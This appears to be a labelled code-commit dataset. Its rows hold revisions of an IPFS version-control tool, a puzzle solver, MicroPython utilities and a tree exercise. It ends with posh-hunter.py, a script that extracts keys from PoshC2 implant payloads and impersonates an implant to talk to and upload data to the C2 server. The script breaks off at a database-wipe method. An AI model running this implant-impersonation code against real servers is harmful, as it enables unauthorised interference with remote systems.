            # Copy the commit to the new branch's head
            commit_path = expand_ref(from_commit)
            mfs_commit_path = self.get_mfs_path(
                self.fs_cwd, branch, branch_info=commit_path)
            mfs_head_path = self.get_mfs_path(
                self.fs_cwd, name, branch_info='head')

            try:
                self.ipfs.files_stat(mfs_commit_path)
            except ipfsapi.exceptions.StatusError:
                if not self.quiet:
                    print('No such commit', file=sys.stderr)
                raise RuntimeError()

            self.ipfs.files_cp(mfs_commit_path, mfs_head_path)

            # Copy commit bundle to workspace and stage, plus a parent1 link
            # from stage to head
            mfs_commit_bundle_path = f'{mfs_commit_path}/bundle'
            mfs_workspace_path = self.get_mfs_path(
                self.fs_cwd, name, branch_info='workspace/bundle')
            mfs_stage_path = self.get_mfs_path(
                self.fs_cwd, name, branch_info='stage/bundle')
            self.ipfs.files_cp(mfs_commit_bundle_path, mfs_workspace_path)
            self.ipfs.files_cp(mfs_commit_bundle_path, mfs_stage_path)

        if not no_checkout:
            self.checkout(name)

    def _load_ref_into_repo(self, fs_repo_root, branch, ref,
                            without_timestamps=False):
        """""" Syncs the fs workspace with the files in ref """"""
        metadata = self.read_metadata(ref)
        added, removed, modified = self.workspace_changes(
            fs_repo_root, metadata, update_meta=False)

        mfs_refpath, _ = refpath_to_mfs(Path(f'@{ref}'))

        for path in added:
            os.remove(path)

        for path in removed | modified:
            mfs_path = self.get_mfs_path(
                fs_repo_root, branch,
                branch_info=(mfs_refpath / path.relative_to(fs_repo_root)))

            timestamp = metadata[str(path)]['timestamp']

            with open(path, 'wb') as f:
                f.write(self.ipfs.files_read(mfs_path))

            os.utime(path, ns=(timestamp, timestamp))

    @atomic
    def checkout(self, name, without_timestamps=False):
        """""" Checks out a branch""""""
        fs_repo_root, _ = self.common()

        try:
            self.ipfs.files_stat(self.get_mfs_path(self.fs_cwd, name))
        except ipfsapi.exceptions.StatusError:
            if not self.quiet: print('No branch by that name exists', file=sys.stderr)
            raise RuntimeError()

        # Write the new branch name to active_branch_name
        # NOTE: truncate here is needed to clear the file before writing
        self.ipfs.files_write(
            self.get_mfs_path(self.fs_cwd, repo_info='active_branch_name'),
            io.BytesIO(bytes(name, 'utf-8')),
            create=True, truncate=True)

        self._load_ref_into_repo(
            fs_repo_root, name, 'workspace', without_timestamps)

    @atomic
    def history(self, show_hash=False):
        """""" Shows the commit history for the current branch. Currently only shows
        the linear history on the first parents side""""""
        fs_repo_root, branch = self.common()

        # Traverse the commits backwards by adding /parent1/parent1/parent1/... etc
        # to the mfs path until it stops
        curr_commit = Path('head')
        commits = []
        while True:
            mfs_commit = self.get_mfs_path(
                fs_repo_root, branch, branch_info=curr_commit)
            mfs_commit_meta = mfs_commit / 'metadata'
            try:
                mfs_commit_hash = self.ipfs.files_stat(mfs_commit)['Hash']
                mfs_commit_ref_hash = self.ipfs.files_stat(
                    mfs_commit / 'bundle/files')['Hash']
            except ipfsapi.exceptions.StatusError:
                # Reached the root of the graph
                break

            meta = self.mfs_read_json(mfs_commit_meta)
            if len(meta) == 0:
                # Reached the root of the graph
                break

            h, ts, msg = mfs_commit_hash[:6], meta['timestamp'], meta['message']
            auth = make_len(meta['author'] or '', 30)
            if not self.quiet: 
                if show_hash:
                    print(f'* {mfs_commit_ref_hash} {ts} {auth}   {msg}')
                else:
                    print(f'* {ts} {auth}   {msg}')

            commits.append(mfs_commit_hash)
            curr_commit = curr_commit / 'parent1'

        return commits

    @atomic
    def show(self, refpath, browser=False):
        """""" Opens a ref in the ipfs file browser """"""
        mfs_commit_hash = self.get_refpath_hash(refpath)
        if browser:
            # TODO: read IPFS node url from settings
            url = f'http://localhost:8080/ipfs/{mfs_commit_hash}'
            if not self.quiet: print(f'Opening {url}')
            webbrowser.open(url)
        else:
            ret = self.ipfs.ls(f'/ipfs/{mfs_commit_hash}')
            obj = ret['Objects'][0]
            if len(obj['Links']) == 0:
                # It's a file, so cat it
                cat = self.ipfs.cat(f'/ipfs/{mfs_commit_hash}').decode('utf-8')
                if not self.quiet:
                    print(cat)
                return cat
            else:
                # It's a folder
                ls = '\n'.join([ln['Name'] for ln in obj['Links']])
                if not self.quiet:
                    print(ls)
                return ls

    @atomic
    def merge(self, refpath):
        """""" Merge refpath into this branch

        """"""
        pass

    @atomic
    def ls(self):
        """""" List branches """"""
        fs_repo_root = self.get_repo_root()
        branches = self.get_branches(fs_repo_root)
        if not self.quiet:
            print('\n'.join(branches))
        return branches
/n/n/n",1
174,251acdd9800dcb2d4a769dd127f10afde0c099ec,"test_undead.py/n/nimport undead
import unittest

class TestWalker(unittest.TestCase):

    def setUp(self):
        test_link = ""https://www.chiark.greenend.org.uk/~sgtatham/puzzles/js/undead.html#4x4:5,2,4,cRdRLbLbR,2,3,1,3,3,3,1,0,0,1,4,0,0,2,3,1""
        board_txt = test_link.split('#')[-1]
        self.board = undead.Board(board_txt)

    def test_walker(self):
        walkman = undead.Walker()
        row = 0
        col = 0
        actual = walkman.walk(self.board, row, col, 'east')

        expected = [(0, 0), (0, 1), (0, 2), (0, 3)]

        self.assertEqual(actual, expected)


if __name__ == ""__main__"":
    unittest.main()/n/n/nundead.py/n/nclass Grid(object):

    def __init__(self):
        self.content = None
        self.filled = False

    def set(self, content):
        if content == 'L':
            # self.content = '\\'
            self.content = 'L'
            self.filled = True
        elif content == 'R':
            # self.content = '/'
            self.content = 'R'
            self.filled = True
        else:
            self.content = content

    def get(self):
        return self.content

    def __str__(self):
        return '|%s|' % self.content


class Board(object):

    def __init__(self, board_str):
        self.dim_x, self.dim_y = self.calc_dim(board_str)
        self.g_count, self.v_count, self.z_count = self.calc_monster_count(board_str)
        self.board = []
        self._init_board()
        self.generate_board(board_str)
        self.north_count, self.east_count, self.south_count, self.west_count = self.calc_board_count(board_str)

    @staticmethod
    def calc_dim(board_str):
        """"""
        Given a string converts it to dimensions 
        :return: x, y
        """"""
        dims = []
        for dim in board_str.split(':')[0].split('x'):
            dims.append(int(dim))
        
        return dims[0], dims[1]

    @staticmethod
    def calc_monster_count(board_str):
        board_split = board_str.split(':')[1].split(',')
        ghost_count = int(board_split[0])
        vampire_count = int(board_split[1])
        zombie_count = int(board_split[2])

        return ghost_count, vampire_count, zombie_count

    def calc_board_count(self, board_str):
        board_split = board_str.split(':')[1].split(',')

        board_count_start = 4

        top_row = board_split[board_count_start: board_count_start + self.dim_x]
        right_col = board_split[board_count_start + self.dim_x: board_count_start + self.dim_x + self.dim_y]

        bottom_row = board_split[board_count_start + self.dim_x + self.dim_y: board_count_start + (self.dim_x * 2) + self.dim_y]
        left_col = board_split[board_count_start + (self.dim_x * 2) + self.dim_y: board_count_start + (self.dim_x * 2) + (self.dim_y * 2)]

        return top_row, right_col, bottom_row, left_col

    def _init_board(self):
        for x in range(0, self.dim_x):
            self.board.append([])
            for y in range(0, self.dim_y):
                empty_grid = Grid()
                self.board[x].append(empty_grid)
        

    def generate_board(self, board_str):
        board_split = board_str.split(':')[1].split(',')
        board_layout = board_split[3]

        x = 0
        y = 0


        for space in board_layout:
            if space == ""L"" or space == ""R"":
                self.board[x][y].set(space)
                if y < self.dim_y - 1:
                    y += 1
                else:
                    y = 0
                    x += 1
            else:
                for count in range(0, (ord(space) - 96)):
                    self.board[x][y].set(' ')
                    if y < self.dim_y - 1:
                        y += 1
                    else:
                        y = 0
                        x += 1    

    def print_board(self):
        x_str = []
        y_str = []
        for x in range(0, self.dim_x):
            for y in range(0, self.dim_y):
                y_str.append(str(self.board[x][y]))
            print(''.join(y_str))
            y_str = []


class Walker(object):
    def __init__(self):
        self.current_x = 0
        self.current_y = 0

    def walk(self, board, row, col, direction, path=[]):
        path.append((row, col))

        if board.board[row][col].get() == 'L':
            direction = self.left_bounce(direction)
        elif board.board[row][col].get() == 'R':
            direction = self.right_bounce(direction)

        if direction == 'north':
            # The top left of the array is considered to be 0. 0
            # as we go down we are incrementing col
            row -= 1
        elif direction == 'east':
            col += 1
        elif direction == 'south':
            row += 1
        elif direction == 'west':
            col -= 1

        if (row >= 0 and row < board.dim_x) and (col >= 0 and col < board.dim_y):
            self.walk(board, row, col, direction)

        return path

    def solve(self):
        pass

    @staticmethod
    def right_bounce(direction):
        if direction == 'north':
            return 'east'
        elif direction == 'east':
            return 'north'
        elif direction == 'south':
            return 'west'
        elif direction == 'west':
            return 'south'
        else:
            raise ValueError('%s not a valid direction' % direction) 

    @staticmethod
    def left_bounce(direction):
        if direction == 'north':
            return 'west'
        elif direction == 'west':
            return 'north'
        elif direction == 'south':
            return 'east'
        elif direction == 'east':
            return 'south'
        else:
            raise ValueError('%s not a valid direction' % direction) 


if __name__ == ""__main__"":
    test_link = ""https://www.chiark.greenend.org.uk/~sgtatham/puzzles/js/undead.html#4x4:5,2,4,cRdRLbLbR,2,3,1,3,3,3,1,0,0,1,4,0,0,2,3,1""
    board_txt = test_link.split('#')[-1]
    board = Board(board_txt)
    print('printing board out')
    board.print_board()

    walkman = Walker()
    row = 0
    col = 0
    print(walkman.walk(board, row, col, 'east'))/n/n/n",0
175,251acdd9800dcb2d4a769dd127f10afde0c099ec,"/test_undead.py/n/nimport undead
import unittest

class TestWalker(unittest.TestCase):

    def setUp(self):
        test_link = ""https://www.chiark.greenend.org.uk/~sgtatham/puzzles/js/undead.html#4x4:5,2,4,cRdRLbLbR,2,3,1,3,3,3,1,0,0,1,4,0,0,2,3,1""
        board_txt = test_link.split('#')[-1]
        board = Board(board_txt)

    def test_walker(self):
        walkman = Walker()
        row = 3
        col = 0
        walkman.walk(board, row, col, 'east')


if __name__ == ""__main__"":
    unittest.main()/n/n/n/undead.py/n/nclass Grid(object):

    def __init__(self):
        self.content = None
        self.filled = False

    def set(self, content):
        if content == 'L':
            # self.content = '\\'
            self.content = 'L'
            self.filled = True
        elif content == 'R':
            # self.content = '/'
            self.content = 'R'
            self.filled = True
        else:
            self.content = content

    def get(self):
        return self.content

    def __str__(self):
        return '|%s|' % self.content


class Board(object):

    def __init__(self, board_str):
        self.dim_x, self.dim_y = self.calc_dim(board_str)
        self.g_count, self.v_count, self.z_count = self.calc_monster_count(board_str)
        self.board = []
        self._init_board()
        self.generate_board(board_str)
        self.north_count, self.east_count, self.south_count, self.west_count = self.calc_board_count(board_str)

    @staticmethod
    def calc_dim(board_str):
        """"""
        Given a string converts it to dimensions 
        :return: x, y
        """"""
        dims = []
        for dim in board_str.split(':')[0].split('x'):
            dims.append(int(dim))
        
        return dims[0], dims[1]

    @staticmethod
    def calc_monster_count(board_str):
        board_split = board_str.split(':')[1].split(',')
        ghost_count = int(board_split[0])
        vampire_count = int(board_split[1])
        zombie_count = int(board_split[2])

        return ghost_count, vampire_count, zombie_count

    def calc_board_count(self, board_str):
        board_split = board_str.split(':')[1].split(',')

        board_count_start = 4

        top_row = board_split[board_count_start: board_count_start + self.dim_x]
        right_col = board_split[board_count_start + self.dim_x: board_count_start + self.dim_x + self.dim_y]

        bottom_row = board_split[board_count_start + self.dim_x + self.dim_y: board_count_start + (self.dim_x * 2) + self.dim_y]
        left_col = board_split[board_count_start + (self.dim_x * 2) + self.dim_y: board_count_start + (self.dim_x * 2) + (self.dim_y * 2)]

        return top_row, right_col, bottom_row, left_col

    def _init_board(self):
        for x in range(0, self.dim_x):
            self.board.append([])
            for y in range(0, self.dim_y):
                empty_grid = Grid()
                self.board[x].append(empty_grid)
        

    def generate_board(self, board_str):
        board_split = board_str.split(':')[1].split(',')
        board_layout = board_split[3]

        x = 0
        y = 0


        for space in board_layout:
            if space == ""L"" or space == ""R"":
                self.board[x][y].set(space)
                if y < self.dim_y - 1:
                    y += 1
                else:
                    y = 0
                    x += 1
            else:
                for count in range(0, (ord(space) - 96)):
                    self.board[x][y].set(' ')
                    if y < self.dim_y - 1:
                        y += 1
                    else:
                        y = 0
                        x += 1    

    def print_board(self):
        x_str = []
        y_str = []
        for x in range(0, self.dim_x):
            for y in range(0, self.dim_y):
                y_str.append(str(self.board[x][y]))
            print(''.join(y_str))
            y_str = []


class Walker(object):
    def __init__(self):
        self.current_x = 0
        self.current_y = 0

    def walk(self, board, row, col, direction, path=[]):
        path.append((row, col))
        print(row, col)
        if board.board[row][col].get() == 'L':
            direction = self.left_bounce(direction)
        elif board.board[row][col].get() == 'R':
            direction = self.right_bounce(direction)

        if direction == 'north':
            # The top left of the array is considered to be 0. 0
            # as we go down we are incrementing col
            row -= 1
        elif direction == 'east':
            col += 1
        elif direction == 'south':
            row += 1
        elif direction == 'west':
            col -= 1

        if (row >= 0 and row < board.dim_x) and (col >= 0 and col < board.dim_y):
            self.walk(board, row, col, direction)

    def solve(self):
        pass

    @staticmethod
    def right_bounce(direction):
        if direction == 'north':
            return 'east'
        elif direction == 'east':
            return 'north'
        elif direction == 'south':
            return 'west'
        elif direction == 'west':
            return 'south'
        else:
            raise ValueError('%s not a valid direction' % direction) 

    @staticmethod
    def left_bounce(direction):
        if direction == 'north':
            return 'west'
        elif direction == 'west':
            return 'north'
        elif direction == 'south':
            return 'east'
        elif direction == 'east':
            return 'south'
        else:
            raise ValueError('%s not a valid direction' % direction) 


if __name__ == ""__main__"":
    test_link = ""https://www.chiark.greenend.org.uk/~sgtatham/puzzles/js/undead.html#4x4:5,2,4,cRdRLbLbR,2,3,1,3,3,3,1,0,0,1,4,0,0,2,3,1""
    board_txt = test_link.split('#')[-1]
    board = Board(board_txt)
    print('printing board out')
    board.print_board()

    walkman = Walker()
    row = 0
    col = 0
    walkman.walk(board, row, col, 'east')/n/n/n",1
176,c82ada5dbeaa94eb44fa2448a4e2b34297fb9f06,"emp_utils.py/n/nimport gc
import os

class _const:
    class ConstError(TypeError):
        pass

    def __setattr__(self, name, value):
        if self.__dict__.get(name):
            raise self.ConstError(""Can't rebind const (%s)"" % name)
        else:
            self.__dict__[name] = value

def is_folder(path):
    try:
        os.listdir(path)
        return True
    except:
        return False


def traverse(path):
    n = dict(name=path, children=[])
    for i in os.listdir(path):
        if is_folder(path + '/' + i):
            n['children'].append(traverse(path + '/' + i))
        else:
            n['children'].append(dict(name=path + '/' +i))
    return n

def config_path():
    try:
        return len(os.listdir('config'))
    except:
        os.mkdir('config')
    finally:
        return len(os.listdir('config'))


def rainbow(output, color=None):
    if color:
        if color == 'green':
            return '\033[1;32m%s\033[0m' % output
        if color == 'red':
            return '\033[1;31m%s\033[0m' % output
        if color == 'blue':
            return '\033[1;34m%s\033[0m' % output
    else:
        return output


def print_left_just(output, length=None):
    if length == None:
        length = len(output)
    return output + (length - len(output)) * ' '


def print_right_just(output, length):
    if length == None:
        length = len(output)
    return (length - len(output)) * ' ' + output


def print_as_a_list_item(index, title, subtile=None):
    index = ('[%s]' % str(index)).center(8).lstrip()
    title = print_left_just(rainbow(title, color='green'))
    if subtile:
        subtile = '\n' + len(index) * ' ' + subtile
    else:
        subtile = ''
    return index + title + subtile


def selection(hint, range):

    index = input(rainbow(hint, color='blue'))
    if int(index) > range or int(index) < 0:
        print(rainbow('out of range!', color='red'))
        selection(hint, range)
    else:
        return int(index)


def mem_analyze(func):
    """"""
    装饰器:内存分析
    """"""

    def wrapper(*args, **kwargs):
        memory_alloc = 'memory alloced: %s kb' % str(gc.mem_alloc() / 1024)
        memory_free = 'memory free: %s kb' % str(gc.mem_free() / 1024)
        gc.collect()
        memory_after_collect = 'after collect: %s kb available' % str(
            gc.mem_free() / 1024)
        print(rainbow(memory_alloc, color='red'))
        print(rainbow(memory_free, color='green'))
        print(rainbow(memory_after_collect, color='blue'))
        func(*args, **kwargs)
        memory_after_func_excute = 'after %s excuted: %s kb available' % (
            func.__name__, str(gc.mem_free() / 1024))
        print(rainbow(memory_after_func_excute, color='red'))

    return wrapper


/n/n/nsetup.py/n/nfrom distutils.core import setup

setup(
    name = 'emp-1zlab-dev',      
    version = '0.1.13',
    py_modules = ['emp_wifi','emp_boot','emp_dev','emp_utils','emp_webrepl'],
    author = 'fuermohao@1zlab.com',        
    author_email = 'fuermohao@outlook.com',
    url = 'http://emp.1zlab.com',
    description = 'EMP(Easy MicroPython) is a upy module to make things Easy on MicroPython.'   
    )/n/n/n",0
177,c82ada5dbeaa94eb44fa2448a4e2b34297fb9f06,"/emp_utils.py/n/nimport gc
import os

class _const:
    class ConstError(TypeError):
        pass

    def __setattr__(self, name, value):
        if self.__dict__.get(name):
            raise self.ConstError(""Can't rebind const (%s)"" % name)
        else:
            self.__dict__[name] = value

def is_folder(path):
    try:
        os.listdir(path)
        return True
    except:
        return False


def traverse(path):
    n = dict(name=path, children=[])
    for i in os.listdir(path):
        if is_folder(path + '/' + i):
            n['children'].append(traverse(path + '/' + i))
        else:
            n['children'].append(dict(name=i))
    return n

def config_path():
    try:
        return len(os.listdir('config'))
    except:
        os.mkdir('config')
    finally:
        return len(os.listdir('config'))


def rainbow(output, color=None):
    if color:
        if color == 'green':
            return '\033[1;32m%s\033[0m' % output
        if color == 'red':
            return '\033[1;31m%s\033[0m' % output
        if color == 'blue':
            return '\033[1;34m%s\033[0m' % output
    else:
        return output


def print_left_just(output, length=None):
    if length == None:
        length = len(output)
    return output + (length - len(output)) * ' '


def print_right_just(output, length):
    if length == None:
        length = len(output)
    return (length - len(output)) * ' ' + output


def print_as_a_list_item(index, title, subtile=None):
    index = ('[%s]' % str(index)).center(8).lstrip()
    title = print_left_just(rainbow(title, color='green'))
    if subtile:
        subtile = '\n' + len(index) * ' ' + subtile
    else:
        subtile = ''
    return index + title + subtile


def selection(hint, range):

    index = input(rainbow(hint, color='blue'))
    if int(index) > range or int(index) < 0:
        print(rainbow('out of range!', color='red'))
        selection(hint, range)
    else:
        return int(index)


def mem_analyze(func):
    """"""
    装饰器:内存分析
    """"""

    def wrapper(*args, **kwargs):
        memory_alloc = 'memory alloced: %s kb' % str(gc.mem_alloc() / 1024)
        memory_free = 'memory free: %s kb' % str(gc.mem_free() / 1024)
        gc.collect()
        memory_after_collect = 'after collect: %s kb available' % str(
            gc.mem_free() / 1024)
        print(rainbow(memory_alloc, color='red'))
        print(rainbow(memory_free, color='green'))
        print(rainbow(memory_after_collect, color='blue'))
        func(*args, **kwargs)
        memory_after_func_excute = 'after %s excuted: %s kb available' % (
            func.__name__, str(gc.mem_free() / 1024))
        print(rainbow(memory_after_func_excute, color='red'))

    return wrapper


/n/n/n/setup.py/n/nfrom distutils.core import setup

setup(
    name = 'emp-1zlab',      
    version = '0.1.13',
    py_modules = ['emp_wifi','emp_boot','emp_dev','emp_utils','emp_webrepl'],
    author = 'fuermohao@1zlab.com',        
    author_email = 'fuermohao@outlook.com',
    url = 'http://emp.1zlab.com',
    description = 'EMP(Easy MicroPython) is a upy module to make things Easy on MicroPython.'   
    )/n/n/n",1
178,98d6fa00297248cfd9ba35659972bee328cda6e1,"BT/all_path.py/n/n#print all the paths from root node that sums up to the given sum
#This function return all the paths from given node which it takes as its argument in the form of list of strings
#This function uses level order traversal
def f(root,s):
    if not root:
        return ['None']
    
    left=f(root.left,s-root.val)
    right=f(root.right,s-root.val)

    new=[]
    for e in left+right:
        new.append(str(root.val)+ ' ' + e)
        
    if root.val==s:
        new.append(str(root.val) + ' ')

    return new


class node:
    def __init__(self,val):
        self.val=val

    left,right,s=None,None,0


'''

'''
#This the tree which we formed below

         10
       /    \
     28      13
           /    \
         14      15
        /   \    / \
       21   22  23  24




#Driver code
root=node(10)
root.left=node(28)
root.right=node(13)
root.right.left=node(14)
root.right.right=node(15)
root.right.left.left=node(21)
root.right.left.right=node(22)
root.right.right.left=node(23)
root.right.right.right=node(24)

for string in f(root,38):
    if 'None' not in string:
        print(string)
/n/n/n",0
179,98d6fa00297248cfd9ba35659972bee328cda6e1,"/BT/all_path.py/n/n#print all the paths from root node that sums up to the given sum
#This function return all the paths from given node which it takes as its argument in the form of list of strings
#This function uses level order traversal
def f(root,s):
    if not root:
        return ['None']
    if root.val==s:
        return [str(root.val) + ' ']
    left=f(root.left,s-root.val)
    right=f(root.right,s-root.val)

    new=[]
    for e in left+right:
        new.append(str(root.val)+ ' ' + e)

    return new


class node:
    def __init__(self,val):
        self.val=val

    left,right,s=None,None,0


'''

'''
#This the tree which we formed below

         10
       /    \
     28      13
           /    \
         14      15
        /   \    / \
       21   22  23  24




#Driver code
root=node(10)
root.left=node(28)
root.right=node(13)
root.right.left=node(14)
root.right.right=node(15)
root.right.left.left=node(21)
root.right.left.right=node(22)
root.right.right.left=node(23)
root.right.right.right=node(24)

for string in f(root,38):
    if 'None' not in string:
        print(string)
/n/n/n",1
180,e523c6418720a20eb247111d21424752f6994ee0,"posh-hunter.py/n/n#!/usr/bin/env python
# Find, monitor and troll a PoshC2 server

import zlib, argparse, os, sys, re, requests, subprocess, datetime, time, base64

class PoshC2Payload:
  
  filepath = None
  useragent = None
  secondstage = None
  encryptionkey = None

  def __init__( self, path ):
    if not os.path.isfile( path ):
      print path + ' isn\'t a file'

    self.filepath = path

  # Attempt to pull info out of implant payload
  def analyse( self ):
    print 'Analysing ' + self.filepath + '...'

    with open( self.filepath, 'rb' ) as f:
      decoded = PoshC2Payload.base64_walk( f.read() )
  
    # print decoded

    # Get custom headers
    headernames = [
      'User-Agent',
      'Host',
      'Referer'
    ]
    self.headers = {}
    for h in headernames:
      m = re.search( h + '"",""([^""]*)""', decoded, re.IGNORECASE )
      if m:
        print h + ': ' + m.group(1)
        self.headers[h] = m.group(1)

    # Get host header
    m = re.search('\$h=""([^""]*)""', decoded )
    if m:
      self.headers['Host'] = m.group(1)
      print 'Host header: ' + m.group(1)

    # Get second stage URL
    m = re.search('\$s=""([^""]*)""', decoded )
    if m:
      self.secondstage = m.group(1)
      print 'Second stage URL: ' + self.secondstage
    
    # Get encryption key
    m = re.search('-key ([/+a-z0-9A-Z]*=*)', decoded )
    if m:
      self.encryptionkey = m.group(1)
      print 'Encryption key: ' + self.encryptionkey

    c2 = PoshC2Server()
    c2.key = self.encryptionkey
    c2.useragent = self.headers['User-Agent']
    return c2

  # Recursively attempt to extract and decode base64
  @staticmethod
  def base64_walk( data ):

    # data = data.decode('utf-16le').encode('utf-8')

    # Convert by stripping zero bytes, lol
    s = ''
    for c in data:
      if ord( c ) != 0:
        s += c
    data = s
    # print ''
    # print 'Attempting to get data from: ' + data

    # Find all base64 strings
    m = re.findall( r'[+/0-9a-zA-Z]{20,}=*', data )
    
    if len( m ) == 0:
      print 'No more base64 found'
      return data

    # Join into one string
    b64 = ''.join(m)
    # print 'Found: ' + b64
    
    decoded = base64.b64decode( b64 )

    # Deflated?
    decompress = zlib.decompressobj(
      -zlib.MAX_WBITS  # see above
    )
    try:
      d = decompress.decompress( decoded )
      if d:
        print 'Data is compressed'
        decoded = d
    except:
      print 'Data is not compressed'

    # Check if the data now contains a user agent, URL 
    m = re.search(r'user-agent',decoded,re.IGNORECASE)
    if m:
      return decoded
    
    return PoshC2Payload.base64_walk( decoded )


class PoshC2Server:

  host = None
  hostheader = None
  key = None
  useragent = None
  referer = None
  cookie = None
  pid = None
  username = None
  domain = None
  debug = False
  sleeptime = 5

  def __init__( self, host=None, hostheader=None ):
    
    self.session = requests.Session()
    self.host = host
    if not hostheader:
      self.hostheader = host
    else:
      self.hostheader = hostheader

  def do_request( self, url, data=None ):
   

    self.debug = False

    # def do_request( self, path, method='GET', data=None, files=None, returnformat='json', savefile=None ):
    headers = {
      'Host': self.hostheader,
      'Referer': self.referer,
      'User-Agent': self.useragent,
      'Cookie': self.cookie
    
    }
    # print headers

    import warnings
    with warnings.catch_warnings():
      warnings.simplefilter(""ignore"")
      try:
        if data:
          response = self.session.post(url, data=data, headers=headers, verify=False ) # , files=files, stream=stream )
        else:
          response = self.session.get(url, headers=headers, verify=False )
      except:
        e = sys.exc_info()[1]
        print 'Request failed: ' + str( e ), 'fail' 
        return False

    if self.debug: 
      print response
      print response.text   
    if response.status_code == 200:
      return response.text
    self.error = response
    if self.debug:
      print self.error
    return False

  def get_encryption( self, iv='0123456789ABCDEF' ):
    from Crypto.Cipher import AES
    # print 'IV: ', iv
    aes = AES.new( base64.b64decode(self.key), AES.MODE_CBC, iv )
    return aes

  # Encrypt a string and base64 encode it
  def encrypt( self, data, gzip=False ):
    # function ENC ($key,$un){
    # $b = [System.Text.Encoding]::UTF8.GetBytes($un)
    # $a = CAM $key
    # $e = $a.CreateEncryptor()
    # $f = $e.TransformFinalBlock($b, 0, $b.Length)
    # [byte[]] $p = $a.IV + $f
    # [System.Convert]::ToBase64String($p)
    # }

    if gzip:
      print 'Gzipping data - pre-zipped len, ' + str(len(data))
      import StringIO
      import gzip
      out = StringIO.StringIO()
      with gzip.GzipFile(fileobj=out, mode=""w"") as f:
        f.write(data)
      data = out.getvalue() 

    # Pad with zeros
    mod = len(data) % 16
    if mod != 0:
      newlen = len(data) + (16-mod)
      data = data.ljust( newlen, '\0' )
    aes = self.get_encryption()
    # print 'Data len: ' + str(len(data))
    data = aes.IV + aes.encrypt( data )
    if not gzip:
      data = base64.b64encode( data )
    return data

  # Decrypt a string from base64 encoding 
  def decrypt( self, data, gzip=False ):
    # iv is first 16 bytes of cipher
    print data
    iv = data[0:16]
    # data = data[16:]
    # print 'IV length: ' + str(len(iv))
    aes = self.get_encryption(iv)
    if not gzip:
      data = base64.b64decode(data)
    data =  aes.decrypt( data )
    if gzip:
      print 'Gunzipping data - pre-zipped len, ' + str(len(data))
      import StringIO
      import gzip
      infile = StringIO.StringIO(data)
      with gzip.GzipFile(fileobj=infile, mode=""r"") as f:
        data = f.read()
    return data[16:]
  
  def setcookie( self, value=None ):
    if value:
      c = value
    else:
    # $o=""$env:userdomain\$u;$u  ;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;http://172.16.88.221""
      if not self.pid:
        import random
        self.pid = random.randrange(300,9999)
      c = self.domain + '\\'
      c += self.username + ';'
      c += self.username + ';' 
      c += self.machine + ';AMD64;' 
      c += str( self.pid ) + ';' 
      c += self.host
    print c
    self.cookie = 'SessionId=' + self.encrypt( c )
    # print self.cookie

  # Get the second stage
  def secondstage( self, url, interact=False ):
    
    # $o=""$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;https://172.16.88.221""
    # $pp=enc -key sBOGMbI+wTzxiN9H8q8y8YFBuD/KGsmvCnwRhDjPVXE= -un $o
    # $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
    self.host = '/'.join(url.split('/')[0:3])
    self.setcookie()
    data = self.do_request( url )
    data = self.decrypt( data )

    print data

    # Get encryption key, URL
    m = re.search( r'\$key *= *""([^""]+)""', data )
    if m:
      print 'Comms encryption key: ' + m.group(1)
      self.key = m.group(1)
    m = re.search(r'\$Server *= *""([^""]+)""', data )
    if m:
      print 'Comms URL: ' + m.group(1)
      self.commsurl = m.group(1)
    m = re.search(r'\$sleeptime *= *([0-9]+)', data )
    if m:
      print 'Sleep time: ' + m.group(1)
      self.sleeptime = int(m.group(1))

    if not interact: return True
    
    self.listen( self.commsurl )

  def getimgdata( self, data ):
    # Just use one image because we don't care
    imagebytes = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACAUlEQVR42rWXi7WCMAyG2xGcRUfQEXAE7wgyAq7gCDqCjiCruAK3f2162pDSlkfOQaRA8+VPH0Grehvw03WdvXi/3/Y4Ho/+Gv9xtG2rc51lH+DOjanT6eSd4RpGba/Xy55vtxsAsj5qAKxzrbV3ajvQvy5IETiV7kMRAzzyNwuA5OYqhE6pDUrgGSgDlTiECGCiGSi3rN1G+HGdt78OI6AUFKWJj40IwNwcSK7r9Rq9TJFwKFgI1JlIDyxNHCJUIQSI3kC0HIIbYPq+H4GRcy2AuDERAyByKbISiJSFuZ8EQL7ddBEtJWXOdCINI4BU9EtVKAZQLPfcMCC5jCXGFybJ+aYABMHUFReizQAiR0L0tmGrMVAMMDULaEHiK92qAO4spgHSr+G8BCCCWDPyGgALsWbUcwD8TgibGpykVOkMkbZiEWDChtEm83dQ+t5nl2tpG14MUKMCnne1xDIAGhvcIXY+bMuPxyMJkPJVCmBD/5jj7g5uTdMkX34+n/NqQlqkQukv7t5F1VlbC0DlGZcbAwptkB1WOmNS/lIAQziyQ6dQpHR/OJ/Par/f+2epok7VhKJzihSd2OlnBoI+zK+UCIR8j1bC7/erdrvdKHqCqVGgBMIDSDkPo59rmAHSDKGiNdqMuKxh9HMs9z5U8Ntx6ktmSTkmfeCIALmqaEv7B/CgdPivPO+zAAAAAElFTkSuQmCC')     
    maxbyteslen = 1500
    maxdatalen = 1500 + len( data )
    imagebyteslen = len(imagebytes)
    paddingbyteslen = maxbyteslen - imagebyteslen
    bytepadding = '.'.ljust(paddingbyteslen,'.')
    imagebytesfull = imagebytes + bytepadding + data
    return imagebytesfull

  def uploadfile( self, localpath, remotepath, data=None ):
    c = 'download-file '+remotepath
    self.setcookie(c)
    if data:
      filedata = data
    else:
      with open( localpath, 'rb' ) as f:
        filedata = f.read()

  #         $bufferSize = 10737418;
  #             $preNumbers = ($ChunkedByte+$totalChunkByte)
  #             $send = Encrypt-Bytes $key ($preNumbers+$chunkBytes)
    buffersize = 10737418
    filesize = len( filedata )
    chunksize = filesize / buffersize
    import math
    totalchunks = int(math.ceil(chunksize))
    if totalchunks < 1: totalchunks = 1
    totalchunkstr = str( totalchunks ).rjust(5,'0')
    chunk = 1
    start = 0
    while chunk <= totalchunks:
      chunkstr = str( chunk ).rjust(5,'0')
      prenumbers=chunkstr + totalchunkstr
      chunkdata = filedata[start:start+buffersize]
      chunk+=1
      start += buffersize
      send = self.encrypt( prenumbers + chunkdata, gzip=True )
      uploadbytes = self.getimgdata( send )
      print 'Chunk data: ' + chunkdata
      print 'Prenumbers: ' + prenumbers
      print 'Imgdata: ' + uploadbytes
      response = self.do_request( self.commsurl, uploadbytes )
      # print response
      if len(response.strip()) > 0:
        print self.decrypt( response )
    return False  

  def wipedb( self ):
